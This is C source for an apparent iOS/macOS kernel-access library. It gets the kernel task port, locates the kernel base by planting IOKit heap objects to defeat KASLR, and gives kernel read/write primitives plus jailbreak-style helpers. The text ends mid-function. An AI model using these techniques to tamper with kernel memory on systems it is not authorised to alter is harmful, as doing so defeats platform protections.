/*
 * libkern.c - Everything that touches the kernel.
 *
 * Copyright (c) 2014 Samuel Groß
 * Copyright (c) 2016-2017 Siguza
 */

#include <dlfcn.h>              // RTLD_*, dl*
#include <limits.h>             // UINT_MAX
#include <stdio.h>              // fprintf, snprintf
#include <stdlib.h>             // free, malloc, random, srandom
#include <string.h>             // memmem
#include <time.h>               // time

#include <mach/mach.h>          // Everything mach
#include <mach-o/loader.h>      // MH_EXECUTE
#include <mach-o/nlist.h>       // struct nlist_64
#include <sys/mman.h>           // mmap, munmap, MAP_FAILED
#include <sys/stat.h>           // fstat, struct stat
#include <sys/syscall.h>        // syscall

#include "arch.h"               // TARGET_MACOS, IMAGE_OFFSET, MACH_TYPE, MACH_HEADER_MAGIC, mach_hdr_t
#include "debug.h"              // DEBUG
#include "mach-o.h"             // CMD_ITERATE

#include "libkern.h"

#define MAX_CHUNK_SIZE 0xFFF /* MIG limitation */

#define VERIFY_PORT(port, ret) \
do \
{ \
    if(MACH_PORT_VALID(port)) \
    { \
        if(ret == KERN_SUCCESS) \
        { \
            DEBUG("Success!"); \
        } \
        else \
        { \
            DEBUG("Got a valid port, but return value is 0x%08x (%s)", ret, mach_error_string(ret)); \
            ret = KERN_SUCCESS; \
        } \
    } \
    else \
    { \
        if(ret == KERN_SUCCESS) \
        { \
            DEBUG("Returned success, but port is invalid (0x%08x)", port); \
            ret = KERN_FAILURE; \
        } \
        else \
        { \
            DEBUG("Failure. Port: 0x%08x, return value: 0x%08x (%s)", port, ret, mach_error_string(ret)); \
        } \
    } \
} while(0)

#define VERIFY_TASK(task, ret) \
do \
{ \
    if(ret == KERN_SUCCESS) \
    { \
        DEBUG("Checking if port is restricted..."); \
        mach_port_array_t __arr; \
        mach_msg_type_number_t __num; \
        ret = mach_ports_lookup(task, &__arr, &__num); \
        if(ret == KERN_SUCCESS) \
        { \
            task_t __self = mach_task_self(); \
            for(size_t __i = 0; __i < __num; ++__i) \
            { \
                mach_port_deallocate(__self, __arr[__i]); \
            } \
        } \
        else \
        { \
            DEBUG("Failure: task port 0x%08x is restricted.", task); \
            ret = KERN_NO_ACCESS; \
        } \
    } \
} while(0)

kern_return_t get_kernel_task(task_t *task)
{
    static task_t kernel_task = MACH_PORT_NULL;
    static bool initialized = false;
    if(!initialized)
    {
        DEBUG("Getting kernel task...");
        kern_return_t ret;
        kernel_task = MACH_PORT_NULL;
        host_t host = mach_host_self();

        // Try common workaround first
        DEBUG("Trying host_get_special_port(4)...");
        ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &kernel_task);
        VERIFY_PORT(kernel_task, ret);
        VERIFY_TASK(kernel_task, ret);

        if(ret != KERN_SUCCESS)
        {
            kernel_task = MACH_PORT_NULL;
#ifdef TARGET_MACOS
            // Huge props to Jonathan Levin for this method!
            // Who needs task_for_pid anyway? :P
            // ...or "needed", as of mid-Sierra. :/
            DEBUG("Trying processor_set_tasks()...");
            mach_port_t name = MACH_PORT_NULL,
                        priv = MACH_PORT_NULL;
            DEBUG("Getting default processor set name port...");
            ret = processor_set_default(host, &name);
            VERIFY_PORT(name, ret);
            if(ret == KERN_SUCCESS)
            {
                DEBUG("Getting default processor set priv port...");
                ret = host_processor_set_priv(host, name, &priv);
                VERIFY_PORT(priv, ret);
                if(ret == KERN_SUCCESS)
                {
                    DEBUG("Getting processor tasks...");
                    task_array_t tasks;
                    mach_msg_type_number_t num;
                    ret = processor_set_tasks(priv, &tasks, &num);
                    if(ret != KERN_SUCCESS)
                    {
                        DEBUG("Failed: %s", mach_error_string(ret));
                    }
                    else
                    {
                        DEBUG("Got %u tasks, looking for kernel task...", num);
                        for(size_t i = 0; i < num; ++i)
                        {
                            int pid = 0;
                            ret = pid_for_task(tasks[i], &pid);
                            if(ret != KERN_SUCCESS)
                            {
                                DEBUG("Failed to get pid for task %lu (%08x): %s", i, tasks[i], mach_error_string(ret));
                                break;
                            }
                            else if(pid == 0)
                            {
                                kernel_task = tasks[i];
                                break;
                            }
                        }
                        if(kernel_task == MACH_PORT_NULL)
                        {
                            DEBUG("Kernel task is not in set.");
                            ret = KERN_FAILURE;
                        }
                    }
                }
            }
#else
            DEBUG("Trying task_for_pid(0)...");
            ret = task_for_pid(mach_task_self(), 0, &kernel_task);
            VERIFY_PORT(kernel_task, ret);
#endif
        }
        VERIFY_TASK(kernel_task, ret);

        if(ret != KERN_SUCCESS)
        {
            DEBUG("Returning failure.");
            return ret;
        }
        DEBUG("Success, caching returned port.");
        initialized = true;
        DEBUG("kernel_task = 0x%08x", kernel_task);
    }
    *task = kernel_task;
    return KERN_SUCCESS;
}

// Kernel Base: This is a long story.
//
// Obtaining the kernel slide/base address is non-trivial, even with access to
// the kernel task port. Using the vm_region_* APIs, however, one can iterate
// over its memory regions, which provides a starting point. Additionally, there
// is a special region (I call it the "base region"), within which the kernel is
// located.
//
//
// Some history:
//
// In Saelo's original code (working up to and including iOS 7), the base region
// would be uniquely identified by being larger than 1 GB. The kernel had a
// simple offset from the region's base address of 0x1000 bytes on 32-bit, and
// 0x2000 bytes on 64-bit.
//
// With iOS 8, the property of being larger than 1GB was no longer unique.
// Additionally, one had to check for ---/--- access permissions, which would
// again uniquely identify the base region. The kernel offset from its base
// address remained the same.
//
// With iOS 9, the kernel's offset from the region's base address was doubled
// for most (but seemingly not all) devices. I simply checked both 0x1000 and
// 0x2000 for 32-bit and 0x2000 and 0x4000 for 64-bit.
//
// Somewhere between iOS 9.0 and 9.1, the kernel started not having a fixed
// offset from the region's base address anymore. In addition to the fixed
// offset, it could have a multiple of 0x100000 added to its address, seemingly
// uncorrelated to the region's base address, as if it had an additional KASLR
// slide applied within the region. Also, the kernel's offset from the region's
// base address could be much larger than the kernel itself.
// I worked around this by first locating the base region, checking for the
// Mach-O magic, and simply adding 0x100000 to the address until I found it.
//
// With iOS 10 (and seemingly even 9 on some devices), the base address
// identification was no longer sufficient, as another null mapping of 64GB size
// had popped up. So in addition to the other two, I added the criterium of a
// size smaller than 16GB.
// In addition to that, the part of the base region between its base address and
// the kernel base does no longer have to be mapped (that is, it's still part of
// the memory region, but trying to access it will cause a panic). This
// completely broke my workaround for iOS 9, and it's also the reason why both
// nonceEnabler and nvram_patcher don't work reliably. It's still possible to
// get it to work through luck, but that chance is pretty small.
//
//
// Current implementation:
//
// The base region still exists, still contains the kernel, and is still
// uniquely identifiable, but more information is required before one should
// attempt to access it. This "more information" can only be obtained from
// other memory regions.
// Now, kernel heap allocations larger than two page sizes go to either the
// kalloc_map or the kernel_map rather than zalloc, meaning they will directly
// pop up on the list of memory regions, and be identifiable by having a
// user_tag of VM_KERN_MEMORY_LIBKERN.
//
// So the current idea is to find a size of which no allocation with user_tag
// VM_KERN_MEMORY_LIBKERN exists, and to subsequently make such an allocation,
// which will then be uniquely identifiable. The allocation further incorporates
// OSObjects, which will contain vtable pointers, which are valid pointers to
// the kernel's base region. From there, we simply search backwards until we
// find the kernel header.


// true = continue, false = abort
typedef bool (*kernel_region_callback_t) (vm_address_t, vm_size_t, vm_region_submap_info_data_64_t*, void*);

// true = success, false = failure
static bool foreach_kernel_region(kernel_region_callback_t cb, void *arg)
{
    DEBUG("Looping over kernel memory regions...");
    task_t kernel_task;
    if(get_kernel_task(&kernel_task) != KERN_SUCCESS)
    {
        return false;
    }

    vm_region_submap_info_data_64_t info;
    vm_size_t size;
    mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;
    unsigned int depth;
    for(vm_address_t addr = 0; 1; addr += size)
    {
        DEBUG("Searching for next region at " ADDR "...", addr);
        depth = UINT_MAX;
        if(vm_region_recurse_64(kernel_task, &addr, &size, &depth, (vm_region_info_t)&info, &info_count) != KERN_SUCCESS)
        {
            break;
        }
        if(!cb(addr, size, &info, arg))
        {
            return false;
        }
    }

    return true;
}

typedef struct
{
    char magic[16];
    uint32_t segoff;
    uint32_t nsegs;
    uint32_t _unused32[2];
    uint64_t _unused64[5];
    uint64_t localoff;
    uint64_t nlocals;
} dysc_hdr_t;

typedef struct
{
    uint64_t addr;
    uint64_t size;
    uint64_t fileoff;
    vm_prot_t maxprot;
    vm_prot_t initprot;
} dysc_seg_t;

typedef struct
{
    uint32_t nlistOffset;
    uint32_t nlistCount;
    uint32_t stringsOffset;
    uint32_t stringsSize;
    uint32_t entriesOffset;
    uint32_t entriesCount;
} dysc_local_info_t;

typedef struct
{
    uint32_t dylibOffset;
    uint32_t nlistStartIndex;
    uint32_t nlistCount;
} dysc_local_entry_t;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

#define IOKIT_PATH "/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit"

static mach_port_t libkern_allocate(vm_size_t size)
{
    mach_port_t port = MACH_PORT_NULL;
    void *IOKit = NULL;
#if defined(__LP64__) && !defined(TARGET_MACOS)
    int fd = 0;
    void *cache = NULL;
    struct stat s = {0};
#endif

    mach_port_t master = MACH_PORT_NULL;
    kern_return_t ret = host_get_io_master(mach_host_self(), &master);
    if(ret != KERN_SUCCESS)
    {
        DEBUG("Failed to get IOKit master port: %s", mach_error_string(ret));
        goto out;
    }

    IOKit = dlopen(IOKIT_PATH, RTLD_LAZY | RTLD_LOCAL | RTLD_FIRST);
    if(IOKit == NULL)
    {
        DEBUG("Failed to load IOKit.");
        goto out;
    }

    // Ye olde MIG
    kern_return_t (*io_service_add_notification_ool)(mach_port_t, const char*, void*, mach_msg_type_number_t, mach_port_t, void*, mach_msg_type_number_t, kern_return_t*, mach_port_t*) = NULL;
#ifdef __LP64__
    // 64-bit IOKit doesn't export the MIG function, but still has a symbol for it.
    // We go through all this trouble rather than statically linking against MIG because
    // that becomes incompatible every now and then, while IOKit is always up to date.

    char *IOServiceOpen = dlsym(IOKit, "IOServiceOpen"); // char for pointer arithmetic
    if(IOServiceOpen == NULL)
    {
        DEBUG("Failed to find IOServiceOpen.");
        goto out;
    }

    mach_hdr_t *IOKit_hdr = NULL;
    uintptr_t addr_IOServiceOpen = 0,
              addr_io_service_add_notification_ool = 0;
    struct nlist_64 *symtab = NULL;
    const char *strtab = NULL;
    uintptr_t cache_base = 0;

#ifdef TARGET_MACOS
    Dl_info IOKit_info;
    if(dladdr(IOServiceOpen, &IOKit_info) == 0)
    {
        DEBUG("Failed to find IOKit header.");
        goto out;
    }
    IOKit_hdr = IOKit_info.dli_fbase;
    if(syscall(294, &cache_base) != 0) // shared_region_check_np
    {
        DEBUG("Failed to find dyld_shared_cache: %s", strerror(errno));
        goto out;
    }
    DEBUG("dyld_shared_cache is at " ADDR, cache_base);
    dysc_hdr_t *cache_hdr = (dysc_hdr_t*)cache_base;
    dysc_seg_t *cache_segs = (dysc_seg_t*)(cache_base + cache_hdr->segoff);
    dysc_seg_t *cache_base_seg = NULL;
    for(size_t i = 0; i < cache_hdr->nsegs; ++i)
    {
        if(cache_segs[i].fileoff == 0 && cache_segs[i].size > 0)
        {
            cache_base_seg = &cache_segs[i];
            break;
        }
    }
    if(cache_base_seg == NULL)
    {
        DEBUG("No segment maps to cache base");
        goto out;
    }
#else
    // TODO: This will have to be reworked once there are more 64-bit sub-archs than just arm64.
    //       It's probably gonna be easiest to use PROC_PIDREGIONPATHINFO, at least that gives the full path on iOS.
    fd = open("/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64", O_RDONLY);
    if(fd == -1)
    {
        DEBUG("Failed to open dyld_shared_cache_arm64 for reading: %s", strerror(errno));
        goto out;
    }
    if(fstat(fd, &s) != 0)
    {
        DEBUG("Failed to stat(dyld_shared_cache_arm64): %s", strerror(errno));
        goto out;
    }
    cache = mmap(NULL, s.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if(cache == MAP_FAILED)
    {
        DEBUG("Failed to map dyld_shared_cache_arm64 to memory: %s", strerror(errno));
        goto out;
    }
    cache_base = (uintptr_t)cache;
    DEBUG("dyld_shared_cache is at " ADDR, cache_base);

    dysc_hdr_t *cache_hdr = cache;
    if(cache_hdr->nlocals == 0)
    {
        DEBUG("Cache contains no local symbols.");
        goto out;
    }
    dysc_local_info_t *local_info = (dysc_local_info_t*)(cache_base + cache_hdr->localoff);
    dysc_local_entry_t *local_entries = (dysc_local_entry_t*)((uintptr_t)local_info + local_info->entriesOffset);
    DEBUG("cache_hdr: " ADDR ", local_info: " ADDR ", local_entries: " ADDR, (uintptr_t)cache_hdr, (uintptr_t)local_info, (uintptr_t)local_entries);
    dysc_local_entry_t *local_entry = NULL;
    struct nlist_64 *local_symtab = (struct nlist_64*)((uintptr_t)local_info + local_info->nlistOffset);
    const char *local_strtab = (const char*)((uintptr_t)local_info + local_info->stringsOffset);
    for(size_t i = 0; i < local_info->entriesCount; ++i)
    {
        mach_hdr_t *dylib_hdr = (mach_hdr_t*)(cache_base + local_entries[i].dylibOffset);
        CMD_ITERATE(dylib_hdr, cmd)
        {
            if(cmd->cmd == LC_ID_DYLIB && strcmp((char*)cmd + ((struct dylib_command*)cmd)->dylib.name.offset, IOKIT_PATH) == 0)
            {
                IOKit_hdr = dylib_hdr;
                local_entry = &local_entries[i];
                local_symtab = &local_symtab[local_entries[i].nlistStartIndex];
                goto found;
            }
        }
    }
    DEBUG("Failed to find local symbols for IOKit.");
    goto out;

    found:;
    DEBUG("IOKit header: " ADDR ", local_symtab: " ADDR ", local_strtab: " ADDR, (uintptr_t)IOKit_hdr, (uintptr_t)local_symtab, (uintptr_t)local_strtab);
    for(size_t i = 0; i < local_entry->nlistCount; ++i)
    {
        const char *name = &local_strtab[local_symtab[i].n_un.n_strx];
        if(strcmp(name, "_io_service_add_notification_ool") == 0)
        {
            addr_io_service_add_notification_ool = local_symtab[i].n_value;
            break;
        }
    }
#endif
    struct symtab_command *symcmd = NULL;
    CMD_ITERATE(IOKit_hdr, cmd)
    {
        if(cmd->cmd == LC_SYMTAB)
        {
            symcmd = (struct symtab_command*)cmd;
#ifdef TARGET_MACOS
            for(size_t i = 0; i < cache_hdr->nsegs; ++i)
            {
                if(cache_segs[i].fileoff <= symcmd->symoff && cache_segs[i].fileoff + cache_segs[i].size > symcmd->symoff)
                {
                    symtab = (struct nlist_64*)(cache_base - cache_base_seg->addr + cache_segs[i].addr + symcmd->symoff - cache_segs[i].fileoff);
                }
                if(cache_segs[i].fileoff <= symcmd->stroff && cache_segs[i].fileoff + cache_segs[i].size > symcmd->stroff)
                {
                    strtab = (const char*)(cache_base - cache_base_seg->addr + cache_segs[i].addr + symcmd->stroff - cache_segs[i].fileoff);
                }
            }
#else
            symtab = (struct nlist_64*)(cache_base + symcmd->symoff);
            strtab = (const char*)(cache_base + symcmd->stroff);
#endif
            break;
        }
    }
    DEBUG("symcmd: " ADDR ", symtab: " ADDR ", strtab: " ADDR, (uintptr_t)symcmd, (uintptr_t)symtab, (uintptr_t)strtab);
    if(symcmd == NULL || symtab == NULL || strtab == NULL)
    {
        DEBUG("Failed to find IOKit symtab.");
        goto out;
    }
    for(size_t i = 0; i < symcmd->nsyms; ++i)
    {
        const char *name = &strtab[symtab[i].n_un.n_strx];
        if(strcmp(name, "_IOServiceOpen") == 0)
        {
            addr_IOServiceOpen = symtab[i].n_value;
        }
#ifdef TARGET_MACOS
        else if(strcmp(name, "_io_service_add_notification_ool") == 0)
        {
            addr_io_service_add_notification_ool = symtab[i].n_value;
        }
#endif
    }
    DEBUG("IOServiceOpen: " ADDR, addr_IOServiceOpen);
    DEBUG("io_service_add_notification_ool: " ADDR, addr_io_service_add_notification_ool);
    if(addr_IOServiceOpen == 0 || addr_io_service_add_notification_ool == 0)
    {
        goto out;
    }
    io_service_add_notification_ool = (void*)(IOServiceOpen - addr_IOServiceOpen + addr_io_service_add_notification_ool);
#else
    // 32-bit just exports the function
    io_service_add_notification_ool = dlsym(IOKit, "io_service_add_notification_ool");
    if(io_service_add_notification_ool == NULL)
    {
        DEBUG("Failed to find io_service_add_notification_ool.");
        goto out;
    }
#endif

    uint32_t dict[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | (size / (2 * sizeof(void*))),
        kOSSerializeSymbol | 4,
        0x636261, // "abc"
        kOSSerializeEndCollection | kOSSerializeBoolean | 1,
    };
    kern_return_t err;
    ret = io_service_add_notification_ool(master, "IOServiceTerminate", dict, sizeof(dict), MACH_PORT_NULL, NULL, 0, &err, &port);
    if(ret == KERN_SUCCESS)
    {
        ret = err;
    }
    if(ret != KERN_SUCCESS)
    {
        DEBUG("Failed to create IONotification: %s", mach_error_string(ret));
        port = MACH_PORT_NULL; // Just in case
        goto out;
    }

    out:;
    if(IOKit != NULL)
    {
        dlclose(IOKit);
    }
#if defined(__LP64__) && !defined(TARGET_MACOS)
    if(cache != NULL)
    {
        munmap(cache, s.st_size);
    }
    if(fd != 0 )
    {
        close(fd);
    }
#endif
    return port;
}

typedef struct
{
    uint32_t num_of_size[16];
    vm_size_t page_size;
    vm_size_t alloc_size;
    vm_address_t vtab;
} get_kernel_base_ios9_cb_args_t;

// Memory tag
#define VM_KERN_MEMORY_LIBKERN 4

// Amount of pages that are too large for zalloc
#define KALLOC_DIRECT_THRESHOLD 3

static bool count_libkern_allocations(vm_address_t addr, vm_size_t size, vm_region_submap_info_data_64_t *info, void *arg)
{
    get_kernel_base_ios9_cb_args_t *args = arg;
    if(info->user_tag == VM_KERN_MEMORY_LIBKERN)
    {
        DEBUG("Found libkern region " ADDR "-" ADDR "...", addr, addr + size);
        size_t idx = (size + args->page_size - 1) / args->page_size;
        if(idx < KALLOC_DIRECT_THRESHOLD)
        {
            DEBUG("Too small, skipping...");
        }
        else
        {
            idx -= KALLOC_DIRECT_THRESHOLD;
            if(idx >= sizeof(args->num_of_size)/sizeof(args->num_of_size[0]))
            {
                DEBUG("Too large, skipping...");
            }
            else
            {
                ++(args->num_of_size[idx]);
            }
        }
    }
    return true;
}

static bool get_kernel_base_ios9_cb(vm_address_t addr, vm_size_t size, vm_region_submap_info_data_64_t *info, void *arg)
{
    get_kernel_base_ios9_cb_args_t *args = arg;
    if(info->user_tag == VM_KERN_MEMORY_LIBKERN && size == args->alloc_size)
    {
        DEBUG("Found matching libkern region " ADDR "-" ADDR ", dumping it...", addr, addr + size);
        vm_address_t obj = 0;
        if(kernel_read(addr, sizeof(void*), &obj) != sizeof(void*))
        {
            DEBUG("Kernel I/O error, aborting.");
            return false;
        }
        DEBUG("Found object: " ADDR, obj);
        if(obj < KERNEL_SPACE)
        {
            return false;
        }
        vm_address_t vtab = 0;
        if(kernel_read(obj, sizeof(void*), &vtab) != sizeof(void*))
        {
            DEBUG("Kernel I/O error, aborting.");
            return false;
        }
        DEBUG("Found vtab: " ADDR, vtab);
        if(vtab < KERNEL_SPACE)
        {
            return false;
        }
        args->vtab = vtab;
        return false; // just to short-circuit, we ignore the return value in the calling func
    }
    return true;
}

static vm_address_t get_kernel_base_ios9(vm_address_t regstart, vm_address_t regend)
{
    get_kernel_base_ios9_cb_args_t args =
    {
        .num_of_size = {0},
        .page_size = 0,
        .alloc_size = 0,
        .vtab = 0,
    };

    host_t host = mach_host_self();
    kern_return_t ret = host_page_size(host, &args.page_size);
    if(ret != KERN_SUCCESS)
    {
        DEBUG("Failed to get host page size: %s", mach_error_string(ret));
        return 0;
    }

    DEBUG("Enumerating libkern allocations...");
    if(!foreach_kernel_region(&count_libkern_allocations, &args))
    {
        return 0;
    }
    for(size_t i = 0; i < sizeof(args.num_of_size)/sizeof(args.num_of_size[0]); ++i)
    {
        if(args.num_of_size[i] == 0)
        {
            args.alloc_size = (i + KALLOC_DIRECT_THRESHOLD) * args.page_size;
            break;
        }
    }
    if(args.alloc_size == 0)
    {
        DEBUG("Failed to find a suitable size for injection, returning 0.");
        return 0;
    }

    DEBUG("Making allocation of size " SIZE "...", args.alloc_size);
    mach_port_t port = libkern_allocate(args.alloc_size);
    if(port == MACH_PORT_NULL)
    {
        return 0;
    }
    foreach_kernel_region(&get_kernel_base_ios9_cb, &args); // don't care about return value
    mach_port_deallocate(mach_task_self(), port);

    if(args.vtab == 0)
    {
        DEBUG("Failed to get any vtab, returning 0.");
        return 0;
    }

    DEBUG("Starting at " ADDR ", searching backwards...", args.vtab);
    for(vm_address_t addr = (args.vtab & ~0xfffff) +
#if TARGET_OSX
            0                   // no offset for macOS
#else
#   ifdef __LP64__
            2 * IMAGE_OFFSET    // 0x4000 for 64-bit on >=9.0
#   else
            IMAGE_OFFSET        // 0x1000 for 32-bit, regardless of OS version
#   endif
#endif
        ; addr > regstart; addr -= 0x100000)
    {
        mach_hdr_t hdr;
        DEBUG("Looking for mach header at " ADDR "...", addr);
        if(kernel_read(addr, sizeof(hdr), &hdr) != sizeof(hdr))
        {
            DEBUG("Kernel I/O error, returning 0.");
            return 0;
        }
        if(hdr.magic == MACH_HEADER_MAGIC && hdr.filetype == MH_EXECUTE)
        {
            DEBUG("Found Mach-O of type MH_EXECUTE at " ADDR ", returning success.", addr);
            return addr;
        }
    }

    DEBUG("Found no mach header, returning 0.");
    return 0;
}

static vm_address_t get_kernel_base_ios8(vm_address_t regstart)
{
    // things used to be so simple...
    vm_address_t addr = regstart + IMAGE_OFFSET + 0x200000;

    mach_hdr_t hdr;
    DEBUG("Looking for mach header at " ADDR "...", addr);
    if(kernel_read(addr, sizeof(hdr), &hdr) != sizeof(hdr))
    {
        DEBUG("Kernel I/O error, returning 0.");
        return 0;
    }
    if(hdr.magic == MACH_HEADER_MAGIC && hdr.filetype == MH_EXECUTE)
    {
        DEBUG("Success!");
    }
    else
    {
        DEBUG("Not a Mach-O header there, subtracting 0x200000.");
        addr -= 0x200000;
    }
    return addr;
}

typedef struct
{
    vm_address_t regstart;
    vm_address_t regend;
} get_kernel_base_cb_args_t;

static bool get_kernel_base_cb(vm_address_t addr, vm_size_t size, vm_region_submap_info_data_64_t *info, void *arg)
{
    get_kernel_base_cb_args_t *args = arg;
    DEBUG("Found region " ADDR "-" ADDR " with %c%c%c", addr, addr + size, (info->protection) & VM_PROT_READ ? 'r' : '-', (info->protection) & VM_PROT_WRITE ? 'w' : '-', (info->protection) & VM_PROT_EXECUTE ? 'x' : '-');
    if
    (
        (info->protection & (VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE)) == 0 &&
#ifdef TARGET_MACOS
        addr ==     0xffffff8000000000 &&
#else
        size >          1024*1024*1024 &&
#   ifdef __LP64__
        size <= 16ULL * 1024*1024*1024 && // this is always true for 32-bit
#   endif
#endif
        info->share_mode == SM_EMPTY
    )
    {
        if(args->regstart == 0 && args->regend == 0)
        {
            DEBUG("Found a matching memory region.");
            args->regstart = addr;
            args->regend   = addr + size;
        }
        else
        {
            DEBUG("Found more than one matching memory region, aborting.");
            return false;
        }
    }

    return true;
}

vm_address_t get_kernel_base(void)
{
    static vm_address_t kbase = 0;
    static bool initialized = false;
    if(!initialized)
    {
        DEBUG("Getting kernel base address...");

        DEBUG("Getting base region address...");
        get_kernel_base_cb_args_t args =
        {
            .regstart = 0,
            .regend = 0,
        };
        if(!foreach_kernel_region(&get_kernel_base_cb, &args))
        {
            return 0;
        }
        if(args.regstart == 0)
        {
            DEBUG("Failed to find base region, returning 0.");
            return 0;
        }
        if(args.regend < args.regstart)
        {
            DEBUG("Base region has overflowing size, returning 0.");
            return 0;
        }
        DEBUG("Base region is at " ADDR "-" ADDR ".", args.regstart, args.regend);

        vm_address_t addr = HAVE_TAGGED_REGIONS ? get_kernel_base_ios8(args.regstart) : get_kernel_base_ios9(args.regstart, args.regend);
        if(addr == 0)
        {
            return 0;
        }

        DEBUG("Got address " ADDR ", doing sanity checks...", addr);
        mach_hdr_t hdr;
        if(kernel_read(addr, sizeof(hdr), &hdr) != sizeof(hdr))
        {
            DEBUG("Kernel I/O error, returning 0.");
            return 0;
        }
        if(hdr.magic != MACH_HEADER_MAGIC)
        {
            DEBUG("Header has wrong magic, returning 0 (%08x)", hdr.magic);
            return 0;
        }
        if(hdr.filetype != MH_EXECUTE)
        {
            DEBUG("Header has wrong filetype, returning 0 (%u)", hdr.filetype);
            return 0;
        }
        if(hdr.cputype != MACH_TYPE)
        {
            DEBUG("Header has wrong architecture, returning 0 (%u)", hdr.cputype);
            return 0;
        }
        void *cmds = malloc(hdr.sizeofcmds);
        if(cmds == NULL)
        {
            DEBUG("Memory allocation error, returning 0.");
            return 0;
        }
        if(kernel_read(addr + sizeof(hdr), hdr.sizeofcmds, cmds) != hdr.sizeofcmds)
        {
            DEBUG("Kernel I/O error, returning 0.");
            free(cmds);
            return 0;
        }
        bool has_userland_address = false,
             has_linking = false,
             has_unixthread = false,
             has_exec = false;
        for
        (
            struct load_command *cmd = cmds, *end = (struct load_command*)((char*)cmds + hdr.sizeofcmds);
            cmd < end;
            cmd = (struct load_command*)((char*)cmd + cmd->cmdsize)
        )
        {
            switch(cmd->cmd)
            {
                case MACH_LC_SEGMENT:
                    {
                        mach_seg_t *seg = (mach_seg_t*)cmd;
                        if(seg->vmaddr < KERNEL_SPACE)
                        {
                            has_userland_address = true;
                            goto end;
                        }
                        if(seg->initprot & VM_PROT_EXECUTE)
                        {
                            has_exec = true;
                        }
                        break;
                    }
                case LC_UNIXTHREAD:
                    has_unixthread = true;
                    break;
                case LC_LOAD_DYLIB:
                case LC_ID_DYLIB:
                case LC_LOAD_DYLINKER:
                case LC_ID_DYLINKER:
                case LC_PREBOUND_DYLIB:
                case LC_LOAD_WEAK_DYLIB:
                case LC_REEXPORT_DYLIB:
                case LC_LAZY_LOAD_DYLIB:
                case LC_DYLD_INFO:
                case LC_DYLD_INFO_ONLY:
                case LC_DYLD_ENVIRONMENT:
                case LC_MAIN:
                    has_linking = true;
                    goto end;
            }
        }
        end:;
        free(cmds);
        if(has_userland_address)
        {
            DEBUG("Found segment with userland address, returning 0.");
            return 0;
        }
        if(has_linking)
        {
            DEBUG("Found linking-related load command, returning 0.");
            return 0;
        }
        if(!has_unixthread)
        {
            DEBUG("Binary is missing LC_UNIXTHREAD, returning 0.");
            return 0;
        }
        if(!has_exec)
        {
            DEBUG("Binary has no executable segment, returning 0.");
            return 0;
        }

        DEBUG("Confirmed base address " ADDR ", caching it.", addr);
        kbase = addr;
        initialized = true;
    }
    return kbase;
}

vm_size_t kernel_read(vm_address_t addr, vm_size_t size, void *buf)
{
    DEBUG("Reading kernel bytes " ADDR "-" ADDR, addr, addr + size);
    kern_return_t ret;
    task_t kernel_task;
    vm_size_t remainder = size,
              bytes_read = 0;

    ret = get_kernel_task(&kernel_task);
    if(ret != KERN_SUCCESS)
    {
        return -1;
    }

    // The vm_* APIs are part of the mach_vm subsystem, which is a MIG thing
    // and therefore has a hard limit of 0x1000 bytes that it accepts. Due to
    // this, we have to do both reading and writing in chunks smaller than that.
    for(vm_address_t end = addr + size; addr < end; remainder -= size)
    {
        size = remainder > MAX_CHUNK_SIZE ? MAX_CHUNK_SIZE : remainder;
        ret = vm_read_overwrite(kernel_task, addr, size, (vm_address_t)&((char*)buf)[bytes_read], &size);
        if(ret != KERN_SUCCESS || size == 0)
        {
            DEBUG("vm_read error: %s", mach_error_string(ret));
            break;
        }
        bytes_read += size;
        addr += size;
    }

    return bytes_read;
}

vm_size_t kernel_write(vm_address_t addr, vm_size_t size, void *buf)
{
    DEBUG("Writing to kernel at " ADDR "-" ADDR, addr, addr + size);
    kern_return_t ret;
    task_t kernel_task;
    vm_size_t remainder = size,
              bytes_written = 0;

    ret = get_kernel_task(&kernel_task);
    if(ret != KERN_SUCCESS)
    {
        return -1;
    }

    for(vm_address_t end = addr + size; addr < end; remainder -= size)
    {
        size = remainder > MAX_CHUNK_SIZE ? MAX_CHUNK_SIZE : remainder;
        ret = vm_write(kernel_task, addr, (vm_offset_t)&((char*)buf)[bytes_written], size);
        if(ret != KERN_SUCCESS)
        {
            DEBUG("vm_write error: %s", mach_error_string(ret));
            break;
        }
        bytes_written += size;
        addr += size;
    }

    return bytes_written;
}

mach_port_t tfp0;

__attribute__((constructor))
void init_tfp0(void) {
    assert(!get_kernel_task(&tfp0));
}

#define ReadAnywhere32 kread_uint32
#define WriteAnywhere32 kwrite_uint32
#define ReadAnywhere64 kread_uint64
#define WriteAnywhere64 kwrite_uint64

kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);

size_t kread(uint64_t where, void *p, size_t size) {
    return kernel_read(where, size, p);
}

uint64_t kread_uint64(uint64_t where){
    uint64_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

uint32_t kread_uint32(uint64_t where){
    uint32_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

size_t kwrite(uint64_t where, const void *p, size_t size){
    return kernel_write(where, size, (void *)p);
}

size_t kwrite_uint64(uint64_t where, uint64_t value){
    return kwrite(where, &value, sizeof(value));
}

size_t kwrite_uint32(uint64_t where, uint32_t value){
    return kwrite(where, &value, sizeof(value));
}

uint64_t physalloc(uint64_t size) {
    uint64_t ret = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t*) &ret, size, VM_FLAGS_ANYWHERE);
    return ret;
}

#include "pte_stuff.h"

uint64_t _kernel_entry;

uint64_t get_kernel_base_unslid(void) {
    vm_address_t kbase;
